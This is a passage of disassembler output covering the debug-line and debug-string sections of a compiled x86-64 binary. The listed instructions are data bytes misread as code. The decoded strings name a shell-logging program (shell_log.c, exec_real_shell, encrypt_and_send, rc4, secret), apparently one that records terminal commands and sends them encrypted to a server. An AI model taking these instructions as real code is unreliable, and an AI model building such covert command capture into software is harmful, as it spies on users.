 43c:	64 69 6e 74 2e 68 00 	imul   $0x400682e,%fs:0x74(%rsi),%ebp
 443:	04 
 444:	00 00                	add    %al,(%rax)
 446:	00 00                	add    %al,(%rax)
 448:	09 02                	or     %eax,(%rdx)
 44a:	8a 2b                	mov    (%rbx),%ch
 44c:	40 00 00             	add    %al,(%rax)
 44f:	00 00                	add    %al,(%rax)
 451:	00 03                	add    %al,(%rbx)
 453:	0d 01 08 3e e6       	or     $0xe63e0801,%eax
 458:	bb ad 9f e5 ad       	mov    $0xade59fad,%ebx
 45d:	9f                   	lahf   
 45e:	bb ad 9f bb 00       	mov    $0xbb9fad,%ebx
 463:	02 04 01             	add    (%rcx,%rax,1),%al
 466:	06                   	(bad)  
 467:	ac                   	lods   %ds:(%rsi),%al
 468:	06                   	(bad)  
 469:	ad                   	lods   %ds:(%rsi),%eax
 46a:	08 bc 03 73 08 12 00 	or     %bh,0x120873(%rbx,%rax,1)
 471:	02 04 01             	add    (%rcx,%rax,1),%al
 474:	06                   	(bad)  
 475:	90                   	nop
 476:	06                   	(bad)  
 477:	03 10                	add    (%rax),%edx
 479:	c8 9f 30 be          	enterq $0x309f,$0xbe
 47d:	d7                   	xlat   %ds:(%rbx)
 47e:	08 30                	or     %dh,(%rax)
 480:	02 2c 13             	add    (%rbx,%rdx,1),%ch
 483:	30 f3                	xor    %dh,%bl
 485:	08 3d 75 08 77 75    	or     %bh,0x75770875(%rip)        # 75770d00 <_end+0x75167b10>
 48b:	bb 00 02 04 02       	mov    $0x2040200,%ebx
 490:	bb 00 02 04 02       	mov    $0x2040200,%ebx
 495:	08 ad 00 02 04 02    	or     %ch,0x2040200(%rbp)
 49b:	02 7d 10             	add    0x10(%rbp),%bh
 49e:	00 02                	add    %al,(%rdx)
 4a0:	04 01                	add    $0x1,%al
 4a2:	06                   	(bad)  
 4a3:	4a 06                	rex.WX (bad) 
 4a5:	08 40 91             	or     %al,-0x6f(%rax)
 4a8:	02 7f 13             	add    0x13(%rdi),%bh
 4ab:	d7                   	xlat   %ds:(%rbx)
 4ac:	30 f3                	xor    %dh,%bl
 4ae:	08 3d bb 93 bb 00    	or     %bh,0xbb93bb(%rip)        # bb986f <_end+0x5b067f>
 4b4:	02 04 02             	add    (%rdx,%rax,1),%al
 4b7:	e5 00                	in     $0x0,%eax
 4b9:	02 04 02             	add    (%rdx,%rax,1),%al
 4bc:	08 ad 00 02 04 02    	or     %ch,0x2040200(%rbp)
 4c2:	02 7f 10             	add    0x10(%rdi),%bh
 4c5:	00 02                	add    %al,(%rdx)
 4c7:	04 01                	add    $0x1,%al
 4c9:	06                   	(bad)  
 4ca:	4a 06                	rex.WX (bad) 
 4cc:	a2 08 75 02 65 13 08 	movabs %al,0x213081365027508
 4d3:	13 02 
 4d5:	02 00                	add    (%rax),%al
 4d7:	01 01                	add    %eax,(%rcx)
 4d9:	59                   	pop    %rcx
 4da:	02 00                	add    (%rax),%al
 4dc:	00 02                	add    %al,(%rdx)
 4de:	00 27                	add    %ah,(%rdi)
 4e0:	00 00                	add    %al,(%rax)
 4e2:	00 01                	add    %al,(%rcx)
 4e4:	01 fb                	add    %edi,%ebx
 4e6:	0e                   	(bad)  
 4e7:	0d 00 01 01 01       	or     $0x1010100,%eax
 4ec:	01 00                	add    %eax,(%rax)
 4ee:	00 00                	add    %al,(%rax)
 4f0:	01 00                	add    %eax,(%rax)
 4f2:	00 01                	add    %al,(%rcx)
 4f4:	00 73 68             	add    %dh,0x68(%rbx)
 4f7:	61                   	(bad)  
 4f8:	31 2e                	xor    %ebp,(%rsi)
 4fa:	63 00                	movslq (%rax),%eax
 4fc:	00 00                	add    %al,(%rax)
 4fe:	00 73 68             	add    %dh,0x68(%rbx)
 501:	61                   	(bad)  
 502:	31 2e                	xor    %ebp,(%rsi)
 504:	68 00 00 00 00       	pushq  $0x0
 509:	00 00                	add    %al,(%rax)
 50b:	09 02                	or     %eax,(%rdx)
 50d:	18 30                	sbb    %dh,(%rax)
 50f:	40 00 00             	add    %al,(%rax)
 512:	00 00                	add    %al,(%rax)
 514:	00 03                	add    %al,(%rbx)
 516:	15 01 83 ad bc       	adc    $0xbcad8301,%eax
 51b:	bb c9 c9 bb c9       	mov    $0xc9bbc9c9,%ebx
 520:	31 08                	xor    %ecx,(%rax)
 522:	5b                   	pop    %rbx
 523:	02 5c 13 02          	add    0x2(%rbx,%rdx,1),%bl
 527:	60                   	(bad)  
 528:	13 02                	adc    (%rdx),%eax
 52a:	60                   	(bad)  
 52b:	13 02                	adc    (%rdx),%eax
 52d:	60                   	(bad)  
 52e:	13 02                	adc    (%rdx),%eax
 530:	60                   	(bad)  
 531:	13 02                	adc    (%rdx),%eax
 533:	60                   	(bad)  
 534:	13 02                	adc    (%rdx),%eax
 536:	60                   	(bad)  
 537:	13 02                	adc    (%rdx),%eax
 539:	60                   	(bad)  
 53a:	13 02                	adc    (%rdx),%eax
 53c:	60                   	(bad)  
 53d:	13 02                	adc    (%rdx),%eax
 53f:	60                   	(bad)  
 540:	13 02                	adc    (%rdx),%eax
 542:	60                   	(bad)  
 543:	13 02                	adc    (%rdx),%eax
 545:	60                   	(bad)  
 546:	13 02                	adc    (%rdx),%eax
 548:	60                   	(bad)  
 549:	13 02                	adc    (%rdx),%eax
 54b:	60                   	(bad)  
 54c:	13 02                	adc    (%rdx),%eax
 54e:	60                   	(bad)  
 54f:	13 03                	adc    (%rbx),%eax
 551:	10 02                	adc    %al,(%rdx)
 553:	60                   	(bad)  
 554:	01 08                	add    %ecx,(%rax)
 556:	21 08                	and    %ecx,(%rax)
 558:	21 08                	and    %ecx,(%rax)
 55a:	21 08                	and    %ecx,(%rax)
 55c:	21 08                	and    %ecx,(%rax)
 55e:	25 02 87 01 13       	and    $0x13018702,%eax
 563:	02 87 01 13 02 87    	add    -0x78fdecff(%rdi),%al
 569:	01 13                	add    %edx,(%rbx)
 56b:	02 87 01 13 02 87    	add    -0x78fdecff(%rdi),%al
 571:	01 13                	add    %edx,(%rbx)
 573:	02 87 01 13 02 87    	add    -0x78fdecff(%rdi),%al
 579:	01 13                	add    %edx,(%rbx)
 57b:	02 87 01 13 02 87    	add    -0x78fdecff(%rdi),%al
 581:	01 13                	add    %edx,(%rbx)
 583:	02 87 01 13 02 87    	add    -0x78fdecff(%rdi),%al
 589:	01 13                	add    %edx,(%rbx)
 58b:	02 87 01 13 02 87    	add    -0x78fdecff(%rdi),%al
 591:	01 13                	add    %edx,(%rbx)
 593:	02 87 01 13 02 87    	add    -0x78fdecff(%rdi),%al
 599:	01 13                	add    %edx,(%rbx)
 59b:	02 87 01 13 02 c6    	add    -0x39fdecff(%rdi),%al
 5a1:	01 13                	add    %edx,(%rbx)
 5a3:	02 c6                	add    %dh,%al
 5a5:	01 13                	add    %edx,(%rbx)
 5a7:	02 c6                	add    %dh,%al
 5a9:	01 13                	add    %edx,(%rbx)
 5ab:	02 c6                	add    %dh,%al
 5ad:	01 1a                	add    %ebx,(%rdx)
 5af:	02 bf 01 13 02 bf    	add    -0x40fdecff(%rdi),%bh
 5b5:	01 13                	add    %edx,(%rbx)
 5b7:	02 bf 01 13 02 bf    	add    -0x40fdecff(%rdi),%bh
 5bd:	01 13                	add    %edx,(%rbx)
 5bf:	02 bf 01 13 02 bf    	add    -0x40fdecff(%rdi),%bh
 5c5:	01 13                	add    %edx,(%rbx)
 5c7:	02 bf 01 13 02 bf    	add    -0x40fdecff(%rdi),%bh
 5cd:	01 13                	add    %edx,(%rbx)
 5cf:	02 bf 01 13 02 bf    	add    -0x40fdecff(%rdi),%bh
 5d5:	01 13                	add    %edx,(%rbx)
 5d7:	02 bf 01 13 02 bf    	add    -0x40fdecff(%rdi),%bh
 5dd:	01 13                	add    %edx,(%rbx)
 5df:	02 bf 01 13 02 bf    	add    -0x40fdecff(%rdi),%bh
 5e5:	01 13                	add    %edx,(%rbx)
 5e7:	02 bf 01 13 02 bf    	add    -0x40fdecff(%rdi),%bh
 5ed:	01 13                	add    %edx,(%rbx)
 5ef:	02 bf 01 13 02 bf    	add    -0x40fdecff(%rdi),%bh
 5f5:	01 13                	add    %edx,(%rbx)
 5f7:	02 bf 01 13 02 bf    	add    -0x40fdecff(%rdi),%bh
 5fd:	01 1a                	add    %ebx,(%rdx)
 5ff:	02 d8                	add    %al,%bl
 601:	01 13                	add    %edx,(%rbx)
 603:	02 d8                	add    %al,%bl
 605:	01 13                	add    %edx,(%rbx)
 607:	02 d8                	add    %al,%bl
 609:	01 13                	add    %edx,(%rbx)
 60b:	02 d8                	add    %al,%bl
 60d:	01 13                	add    %edx,(%rbx)
 60f:	02 d8                	add    %al,%bl
 611:	01 13                	add    %edx,(%rbx)
 613:	02 d8                	add    %al,%bl
 615:	01 13                	add    %edx,(%rbx)
 617:	02 d8                	add    %al,%bl
 619:	01 13                	add    %edx,(%rbx)
 61b:	02 d8                	add    %al,%bl
 61d:	01 13                	add    %edx,(%rbx)
 61f:	02 d8                	add    %al,%bl
 621:	01 13                	add    %edx,(%rbx)
 623:	02 d8                	add    %al,%bl
 625:	01 13                	add    %edx,(%rbx)
 627:	02 d8                	add    %al,%bl
 629:	01 13                	add    %edx,(%rbx)
 62b:	02 d8                	add    %al,%bl
 62d:	01 13                	add    %edx,(%rbx)
 62f:	02 d8                	add    %al,%bl
 631:	01 13                	add    %edx,(%rbx)
 633:	02 d8                	add    %al,%bl
 635:	01 13                	add    %edx,(%rbx)
 637:	02 d8                	add    %al,%bl
 639:	01 13                	add    %edx,(%rbx)
 63b:	02 d8                	add    %al,%bl
 63d:	01 13                	add    %edx,(%rbx)
 63f:	02 d8                	add    %al,%bl
 641:	01 13                	add    %edx,(%rbx)
 643:	02 d8                	add    %al,%bl
 645:	01 13                	add    %edx,(%rbx)
 647:	02 d8                	add    %al,%bl
 649:	01 13                	add    %edx,(%rbx)
 64b:	02 d8                	add    %al,%bl
 64d:	01 1a                	add    %ebx,(%rdx)
 64f:	02 c1                	add    %cl,%al
 651:	01 13                	add    %edx,(%rbx)
 653:	02 c1                	add    %cl,%al
 655:	01 13                	add    %edx,(%rbx)
 657:	02 c1                	add    %cl,%al
 659:	01 13                	add    %edx,(%rbx)
 65b:	02 c1                	add    %cl,%al
 65d:	01 13                	add    %edx,(%rbx)
 65f:	02 c1                	add    %cl,%al
 661:	01 13                	add    %edx,(%rbx)
 663:	02 c1                	add    %cl,%al
 665:	01 13                	add    %edx,(%rbx)
 667:	02 c1                	add    %cl,%al
 669:	01 13                	add    %edx,(%rbx)
 66b:	02 c1                	add    %cl,%al
 66d:	01 13                	add    %edx,(%rbx)
 66f:	02 c1                	add    %cl,%al
 671:	01 13                	add    %edx,(%rbx)
 673:	02 c1                	add    %cl,%al
 675:	01 13                	add    %edx,(%rbx)
 677:	02 c1                	add    %cl,%al
 679:	01 13                	add    %edx,(%rbx)
 67b:	02 c1                	add    %cl,%al
 67d:	01 13                	add    %edx,(%rbx)
 67f:	02 c1                	add    %cl,%al
 681:	01 13                	add    %edx,(%rbx)
 683:	02 c1                	add    %cl,%al
 685:	01 13                	add    %edx,(%rbx)
 687:	02 c1                	add    %cl,%al
 689:	01 13                	add    %edx,(%rbx)
 68b:	02 c1                	add    %cl,%al
 68d:	01 13                	add    %edx,(%rbx)
 68f:	02 c1                	add    %cl,%al
 691:	01 13                	add    %edx,(%rbx)
 693:	02 c1                	add    %cl,%al
 695:	01 13                	add    %edx,(%rbx)
 697:	02 c1                	add    %cl,%al
 699:	01 13                	add    %edx,(%rbx)
 69b:	02 c1                	add    %cl,%al
 69d:	01 17                	add    %edx,(%rdi)
 69f:	08 e5                	or     %ah,%ch
 6a1:	08 e5                	or     %ah,%ch
 6a3:	08 e5                	or     %ah,%ch
 6a5:	08 e5                	or     %ah,%ch
 6a7:	08 e5                	or     %ah,%ch
 6a9:	31 08                	xor    %ecx,(%rax)
 6ab:	3f                   	(bad)  
 6ac:	00 02                	add    %al,(%rdx)
 6ae:	04 01                	add    $0x1,%al
 6b0:	06                   	(bad)  
 6b1:	74 06                	je     6b9 <_init-0x4006df>
 6b3:	5a                   	pop    %rdx
 6b4:	d7                   	xlat   %ds:(%rbx)
 6b5:	ca 08 4b             	lret   $0x4b08
 6b8:	f4                   	hlt    
 6b9:	c9                   	leaveq 
 6ba:	08 3e                	or     %bh,(%rsi)
 6bc:	00 02                	add    %al,(%rdx)
 6be:	04 01                	add    $0x1,%al
 6c0:	06                   	(bad)  
 6c1:	74 06                	je     6c9 <_init-0x4006cf>
 6c3:	a0 02 26 14 08 67 83 	movabs 0x8583836708142602,%al
 6ca:	83 85 
 6cc:	4c 08 2f             	rex.WR or %r13b,(%rdi)
 6cf:	59                   	pop    %rcx
 6d0:	00 02                	add    %al,(%rdx)
 6d2:	04 01                	add    $0x1,%al
 6d4:	54                   	push   %rsp
 6d5:	7b 76                	jnp    74d <_init-0x40064b>
 6d7:	02 26                	add    (%rsi),%ah
 6d9:	15 03 0b 2e f2       	adc    $0xf22e0b03,%eax
 6de:	e9 d7 b9 76 e6       	jmpq   ffffffffe676c0ba <_end+0xffffffffe6162eca>
 6e3:	02 28                	add    (%rax),%ch
 6e5:	13 02                	adc    (%rdx),%eax
 6e7:	28 14 d7             	sub    %dl,(%rdi,%rdx,8)
 6ea:	00 02                	add    %al,(%rdx)
 6ec:	04 01                	add    $0x1,%al
 6ee:	06                   	(bad)  
 6ef:	74 00                	je     6f1 <_init-0x4006a7>
 6f1:	02 04 02             	add    (%rdx,%rax,1),%al
 6f4:	ac                   	lods   %ds:(%rsi),%al
 6f5:	00 02                	add    %al,(%rdx)
 6f7:	04 03                	add    $0x3,%al
 6f9:	90                   	nop
 6fa:	00 02                	add    %al,(%rdx)
 6fc:	04 03                	add    $0x3,%al
 6fe:	06                   	(bad)  
 6ff:	4c 00 02             	rex.WR add %r8b,(%rdx)
 702:	04 03                	add    $0x3,%al
 704:	08 4b 00             	or     %cl,0x0(%rbx)
 707:	02 04 03             	add    (%rbx,%rax,1),%al
 70a:	08 76 00             	or     %dh,0x0(%rsi)
 70d:	02 04 03             	add    (%rbx,%rax,1),%al
 710:	02 52 13             	add    0x13(%rdx),%dl
 713:	00 02                	add    %al,(%rdx)
 715:	04 03                	add    $0x3,%al
 717:	02 54 13 00          	add    0x0(%rbx,%rdx,1),%dl
 71b:	02 04 03             	add    (%rbx,%rax,1),%al
 71e:	02 54 13 00          	add    0x0(%rbx,%rdx,1),%dl
 722:	02 04 03             	add    (%rbx,%rax,1),%al
 725:	02 54 13 00          	add    0x0(%rbx,%rdx,1),%dl
 729:	02 04 03             	add    (%rbx,%rax,1),%al
 72c:	02 54 13 06          	add    0x6(%rbx,%rdx,1),%dl
 730:	e4 02                	in     $0x2,%al
 732:	07                   	(bad)  
 733:	00 01                	add    %al,(%rcx)
 735:	01 a5 00 00 00 02    	add    %esp,0x2000000(%rbp)
 73b:	00 25 00 00 00 01    	add    %ah,0x1000000(%rip)        # 1000741 <_end+0x9f7551>
 741:	01 fb                	add    %edi,%ebx
 743:	0e                   	(bad)  
 744:	0d 00 01 01 01       	or     $0x1010100,%eax
 749:	01 00                	add    %eax,(%rax)
 74b:	00 00                	add    %al,(%rax)
 74d:	01 00                	add    %eax,(%rax)
 74f:	00 01                	add    %al,(%rcx)
 751:	00 72 63             	add    %dh,0x63(%rdx)
 754:	34 2e                	xor    $0x2e,%al
 756:	63 00                	movslq (%rax),%eax
 758:	00 00                	add    %al,(%rax)
 75a:	00 72 63             	add    %dh,0x63(%rdx)
 75d:	34 2e                	xor    $0x2e,%al
 75f:	68 00 00 00 00       	pushq  $0x0
 764:	00 00                	add    %al,(%rax)
 766:	09 02                	or     %eax,(%rdx)
 768:	dd 75 40             	fnsave 0x40(%rbp)
 76b:	00 00                	add    %al,(%rax)
 76d:	00 00                	add    %al,(%rax)
 76f:	00 15 e7 9f ad bc    	add    %dl,-0x43526019(%rip)        # ffffffffbcada75c <_end+0xffffffffbc4d156c>
 775:	00 02                	add    %al,(%rdx)
 777:	04 02                	add    $0x2,%al
 779:	92                   	xchg   %eax,%edx
 77a:	00 02                	add    %al,(%rdx)
 77c:	04 02                	add    $0x2,%al
 77e:	08 80 00 02 04 01    	or     %al,0x1040200(%rax)
 784:	06                   	(bad)  
 785:	4a 06                	rex.WX (bad) 
 787:	95                   	xchg   %eax,%ebp
 788:	ca bc 08             	lret   $0x8bc
 78b:	83 02 23             	addl   $0x23,(%rdx)
 78e:	13 02                	adc    (%rdx),%eax
 790:	45 13 00             	adc    (%r8),%r8d
 793:	02 04 01             	add    (%rcx,%rax,1),%al
 796:	06                   	(bad)  
 797:	ba 06 6f 00 02       	mov    $0x2006f06,%edx
 79c:	04 01                	add    $0x1,%al
 79e:	06                   	(bad)  
 79f:	4a 06                	rex.WX (bad) 
 7a1:	cf                   	iret   
 7a2:	31 e7                	xor    %esp,%edi
 7a4:	91                   	xchg   %eax,%ecx
 7a5:	9f                   	lahf   
 7a6:	bc 00 02 04 02       	mov    $0x2040200,%esp
 7ab:	bc 00 02 04 02       	mov    $0x2040200,%esp
 7b0:	02 25 13 00 02 04    	add    0x4020013(%rip),%ah        # 40207c9 <_end+0x3a175d9>
 7b6:	02 f3                	add    %bl,%dh
 7b8:	00 02                	add    %al,(%rdx)
 7ba:	04 02                	add    $0x2,%al
 7bc:	02 32                	add    (%rdx),%dh
 7be:	13 00                	adc    (%rax),%eax
 7c0:	02 04 02             	add    (%rdx,%rax,1),%al
 7c3:	08 83 00 02 04 02    	or     %al,0x2040200(%rbx)
 7c9:	03 7a 02             	add    0x2(%rdx),%edi
 7cc:	41 01 00             	add    %eax,(%r8)
 7cf:	02 04 01             	add    (%rcx,%rax,1),%al
 7d2:	06                   	(bad)  
 7d3:	4a 06                	rex.WX (bad) 
 7d5:	03 09                	add    (%rcx),%ecx
 7d7:	ba 91 9f 02 02       	mov    $0x2029f91,%edx
 7dc:	00 01                	add    %al,(%rcx)
 7de:	01                   	.byte 0x1

Disassembly of section .debug_str:

0000000000000000 <.debug_str>:
   0:	73 69                	jae    6b <_init-0x400d2d>
   2:	67 68 61 6e 64 6c    	addr32 pushq $0x6c646e61
   8:	65                   	gs
   9:	72 00                	jb     b <_init-0x400d8d>
   b:	73 68                	jae    75 <_init-0x400d23>
   d:	65                   	gs
   e:	6c                   	insb   (%dx),%es:(%rdi)
   f:	6c                   	insb   (%dx),%es:(%rdi)
  10:	5f                   	pop    %rdi
  11:	6c                   	insb   (%dx),%es:(%rdi)
  12:	6f                   	outsl  %ds:(%rsi),(%dx)
  13:	67 2e 63 00          	movslq %cs:(%eax),%eax
  17:	49 50                	rex.WB push %r8
  19:	50                   	push   %rax
  1a:	52                   	push   %rdx
  1b:	4f 54                	rex.WRXB push %r12
  1d:	4f 5f                	rex.WRXB pop %r15
  1f:	50                   	push   %rax
  20:	49                   	rex.WB
  21:	4d 00 63 5f          	rex.WRB add %r12b,0x5f(%r11)
  25:	6c                   	insb   (%dx),%es:(%rdi)
  26:	69 6e 65 00 49 50 50 	imul   $0x50504900,0x65(%rsi),%ebp
  2d:	52                   	push   %rdx
  2e:	4f 54                	rex.WRXB push %r12
  30:	4f 5f                	rex.WRXB pop %r15
  32:	44                   	rex.R
  33:	43                   	rex.XB
  34:	43 50                	rex.XB push %r8
  36:	00 67 6f             	add    %ah,0x6f(%rdi)
  39:	74 5f                	je     9a <_init-0x400cfe>
  3b:	73 69                	jae    a6 <_init-0x400cf2>
  3d:	67 63 68 6c          	movslq 0x6c(%eax),%ebp
  41:	64 00 53 4f          	add    %dl,%fs:0x4f(%rbx)
  45:	43                   	rex.XB
  46:	4b 5f                	rex.WXB pop %r15
  48:	4e                   	rex.WRX
  49:	4f                   	rex.WRXB
  4a:	4e                   	rex.WRX
  4b:	42                   	rex.X
  4c:	4c                   	rex.WR
  4d:	4f                   	rex.WRXB
  4e:	43                   	rex.XB
  4f:	4b 00 49 50          	rex.WXB add %cl,0x50(%r9)
  53:	50                   	push   %rax
  54:	52                   	push   %rdx
  55:	4f 54                	rex.WRXB push %r12
  57:	4f 5f                	rex.WRXB pop %r15
  59:	45                   	rex.RB
  5a:	4e                   	rex.WRX
  5b:	43                   	rex.XB
  5c:	41 50                	push   %r8
  5e:	00 49 50             	add    %cl,0x50(%rcx)
  61:	50                   	push   %rax
  62:	52                   	push   %rdx
  63:	4f 54                	rex.WRXB push %r12
  65:	4f 5f                	rex.WRXB pop %r15
  67:	49                   	rex.WB
  68:	47                   	rex.RXB
  69:	4d 50                	rex.WRB push %r8
  6b:	00 69 6e             	add    %ch,0x6e(%rcx)
  6e:	5f                   	pop    %rdi
  6f:	61                   	(bad)  
  70:	64                   	fs
  71:	64                   	fs
  72:	72 5f                	jb     d3 <_init-0x400cc5>
  74:	74 00                	je     76 <_init-0x400d22>
  76:	67 6f                	outsl  %ds:(%esi),(%dx)
  78:	74 5f                	je     d9 <_init-0x400cbf>
  7a:	73 69                	jae    e5 <_init-0x400cb3>
  7c:	67 77 69             	addr32 ja e8 <_init-0x400cb0>
  7f:	6e                   	outsb  %ds:(%rsi),(%dx)
  80:	63 68 00             	movslq 0x0(%rax),%ebp
  83:	63 5f 69             	movslq 0x69(%rdi),%ebx
  86:	73 70                	jae    f8 <_init-0x400ca0>
  88:	65 65 64 00 73 65    	gs gs add %dh,%fs:%gs:0x65(%rbx)
  8e:	63 72 65             	movslq 0x65(%rdx),%esi
  91:	74 00                	je     93 <_init-0x400d05>
  93:	49 50                	rex.WB push %r8
  95:	50                   	push   %rax
  96:	52                   	push   %rdx
  97:	4f 54                	rex.WRXB push %r12
  99:	4f 5f                	rex.WRXB pop %r15
  9b:	52                   	push   %rdx
  9c:	53                   	push   %rbx
  9d:	56                   	push   %rsi
  9e:	50                   	push   %rax
  9f:	00 74 65 72          	add    %dh,0x72(%rbp,%riz,2)
  a3:	6d                   	insl   (%dx),%es:(%rdi)
  a4:	69 6f 73 00 53 4f 43 	imul   $0x434f5300,0x73(%rdi),%ebp
  ab:	4b 5f                	rex.WXB pop %r15
  ad:	50                   	push   %rax
  ae:	41                   	rex.B
  af:	43                   	rex.XB
  b0:	4b                   	rex.WXB
  b1:	45 54                	rex.RB push %r12
  b3:	00 73 68             	add    %dh,0x68(%rbx)
  b6:	61                   	(bad)  
  b7:	31 5f 63             	xor    %ebx,0x63(%rdi)
  ba:	6f                   	outsl  %ds:(%rsi),(%dx)
  bb:	6e                   	outsb  %ds:(%rsi),(%dx)
  bc:	74 65                	je     123 <_init-0x400c75>
  be:	78 74                	js     134 <_init-0x400c64>
  c0:	00 6c 6f 6e          	add    %ch,0x6e(%rdi,%rbp,2)
  c4:	67 20 6c 6f 6e       	and    %ch,0x6e(%edi,%ebp,2)
  c9:	67 20 69 6e          	and    %ch,0x6e(%ecx)
  cd:	74 00                	je     cf <_init-0x400cc9>
  cf:	49 50                	rex.WB push %r8
  d1:	50                   	push   %rax
  d2:	52                   	push   %rdx
  d3:	4f 54                	rex.WRXB push %r12
  d5:	4f 5f                	rex.WRXB pop %r15
  d7:	55                   	push   %rbp
  d8:	44 50                	rex.R push %rax
  da:	00 6c 6f 6e          	add    %ch,0x6e(%rdi,%rbp,2)
  de:	67 20 6c 6f 6e       	and    %ch,0x6e(%edi,%ebp,2)
  e3:	67 20 75 6e          	and    %dh,0x6e(%ebp)
  e7:	73 69                	jae    152 <_init-0x400c46>
  e9:	67 6e                	outsb  %ds:(%esi),(%dx)
  eb:	65 64 20 69 6e       	gs and %ch,%fs:%gs:0x6e(%rcx)
  f0:	74 00                	je     f2 <_init-0x400ca6>
  f2:	73 68                	jae    15c <_init-0x400c3c>
  f4:	61                   	(bad)  
  f5:	31 73 75             	xor    %esi,0x75(%rbx)
  f8:	6d                   	insl   (%dx),%es:(%rdi)
  f9:	00 73 68             	add    %dh,0x68(%rbx)
  fc:	61                   	(bad)  
  fd:	31 00                	xor    %eax,(%rax)
  ff:	73 65                	jae    166 <_init-0x400c32>
 101:	72 76                	jb     179 <_init-0x400c1f>
 103:	65                   	gs
 104:	72 5f                	jb     165 <_init-0x400c33>
 106:	66                   	data16
 107:	64 00 65 78          	add    %ah,%fs:0x78(%rbp)
 10b:	65 63 5f 72          	movslq %gs:0x72(%rdi),%ebx
 10f:	65                   	gs
 110:	61                   	(bad)  
 111:	6c                   	insb   (%dx),%es:(%rdi)
 112:	5f                   	pop    %rdi
 113:	73 68                	jae    17d <_init-0x400c1b>
 115:	65                   	gs
 116:	6c                   	insb   (%dx),%es:(%rdi)
 117:	6c                   	insb   (%dx),%es:(%rdi)
 118:	00 63 5f             	add    %ah,0x5f(%rbx)
 11b:	6f                   	outsl  %ds:(%rsi),(%dx)
 11c:	66                   	data16
 11d:	6c                   	insb   (%dx),%es:(%rdi)
 11e:	61                   	(bad)  
 11f:	67 00 49 50          	add    %cl,0x50(%ecx)
 123:	50                   	push   %rax
 124:	52                   	push   %rdx
 125:	4f 54                	rex.WRXB push %r12
 127:	4f 5f                	rex.WRXB pop %r15
 129:	54                   	push   %rsp
 12a:	43 50                	rex.XB push %r8
 12c:	00 53 4f             	add    %dl,0x4f(%rbx)
 12f:	43                   	rex.XB
 130:	4b 5f                	rex.WXB pop %r15
 132:	53                   	push   %rbx
 133:	54                   	push   %rsp
 134:	52                   	push   %rdx
 135:	45                   	rex.RB
 136:	41                   	rex.B
 137:	4d 00 75 69          	rex.WRB add %r14b,0x69(%r13)
 13b:	6e                   	outsb  %ds:(%rsi),(%dx)
 13c:	74 31                	je     16f <_init-0x400c29>
 13e:	36                   	ss
 13f:	5f                   	pop    %rdi
 140:	74 00                	je     142 <_init-0x400c56>
 142:	73 65                	jae    1a9 <_init-0x400bef>
 144:	74 75                	je     1bb <_init-0x400bdd>
 146:	70 5f                	jo     1a7 <_init-0x400bf1>
 148:	74 65                	je     1af <_init-0x400be9>
 14a:	72 6d                	jb     1b9 <_init-0x400bdf>
 14c:	69 6e 61 6c 00 63 6d 	imul   $0x6d63006c,0x61(%rsi),%ebp
 153:	64                   	fs
 154:	5f                   	pop    %rdi
 155:	73 74                	jae    1cb <_init-0x400bcd>
 157:	72 00                	jb     159 <_init-0x400c3f>
 159:	63 6d 64             	movslq 0x64(%rbp),%ebp
 15c:	5f                   	pop    %rdi
 15d:	73 74                	jae    1d3 <_init-0x400bc5>
 15f:	72 5f                	jb     1c0 <_init-0x400bd8>
 161:	6d                   	insl   (%dx),%es:(%rdi)
 162:	61                   	(bad)  
 163:	78 5f                	js     1c4 <_init-0x400bd4>
 165:	6c                   	insb   (%dx),%es:(%rdi)
 166:	65 6e                	outsb  %gs:(%rsi),(%dx)
 168:	67 74 68             	addr32 je 1d3 <_init-0x400bc5>
 16b:	00 53 65             	add    %dl,0x65(%rbx)
 16e:	73 73                	jae    1e3 <_init-0x400bb5>
 170:	69 6f 6e 5f 44 61 74 	imul   $0x7461445f,0x6e(%rdi),%ebp
 177:	61                   	(bad)  
 178:	5f                   	pop    %rdi
 179:	74 00                	je     17b <_init-0x400c1d>
 17b:	73 69                	jae    1e6 <_init-0x400bb2>
 17d:	6e                   	outsb  %ds:(%rsi),(%dx)
 17e:	5f                   	pop    %rdi
 17f:	7a 65                	jp     1e6 <_init-0x400bb2>
 181:	72 6f                	jb     1f2 <_init-0x400ba6>
 183:	00 49 50             	add    %cl,0x50(%rcx)
 186:	50                   	push   %rax
 187:	52                   	push   %rdx
 188:	4f 54                	rex.WRXB push %r12
 18a:	4f 5f                	rex.WRXB pop %r15
 18c:	43                   	rex.XB
 18d:	4f                   	rex.WRXB
 18e:	4d 50                	rex.WRB push %r8
 190:	00 49 50             	add    %cl,0x50(%rcx)
 193:	50                   	push   %rax
 194:	52                   	push   %rdx
 195:	4f 54                	rex.WRXB push %r12
 197:	4f 5f                	rex.WRXB pop %r15
 199:	49 50                	rex.WB push %r8
 19b:	00 53 4f             	add    %dl,0x4f(%rbx)
 19e:	43                   	rex.XB
 19f:	4b 5f                	rex.WXB pop %r15
 1a1:	52                   	push   %rdx
 1a2:	44                   	rex.R
 1a3:	4d 00 66 64          	rex.WRB add %r12b,0x64(%r14)
 1a7:	5f                   	pop    %rdi
 1a8:	73 65                	jae    20f <_init-0x400b89>
 1aa:	74 00                	je     1ac <_init-0x400bec>
 1ac:	63 5f 6c             	movslq 0x6c(%rdi),%ebx
 1af:	66                   	data16
 1b0:	6c                   	insb   (%dx),%es:(%rdi)
 1b1:	61                   	(bad)  
 1b2:	67 00 73 6c          	add    %dh,0x6c(%ebx)
 1b6:	61                   	(bad)  
 1b7:	76 65                	jbe    21e <_init-0x400b7a>
 1b9:	00 65 6e             	add    %ah,0x6e(%rbp)
 1bc:	63 72 79             	movslq 0x79(%rdx),%esi
 1bf:	70 74                	jo     235 <_init-0x400b63>
 1c1:	5f                   	pop    %rdi
 1c2:	61                   	(bad)  
 1c3:	6e                   	outsb  %ds:(%rsi),(%dx)
 1c4:	64                   	fs
 1c5:	5f                   	pop    %rdi
 1c6:	73 65                	jae    22d <_init-0x400b6b>
 1c8:	6e                   	outsb  %ds:(%rsi),(%dx)
 1c9:	64 00 74 65 73       	add    %dh,%fs:0x73(%rbp,%riz,2)
 1ce:	74 5f                	je     22f <_init-0x400b69>
 1d0:	6c                   	insb   (%dx),%es:(%rdi)
 1d1:	65 6e                	outsb  %gs:(%rsi),(%dx)
 1d3:	00 63 6d             	add    %ah,0x6d(%rbx)
 1d6:	64                   	fs
 1d7:	5f                   	pop    %rdi
 1d8:	73 74                	jae    24e <_init-0x400b4a>
 1da:	72 5f                	jb     23b <_init-0x400b5d>
 1dc:	69 6e 64 65 78 00 49 	imul   $0x49007865,0x64(%rsi),%ebp
 1e3:	50                   	push   %rax
 1e4:	50                   	push   %rax
 1e5:	52                   	push   %rdx
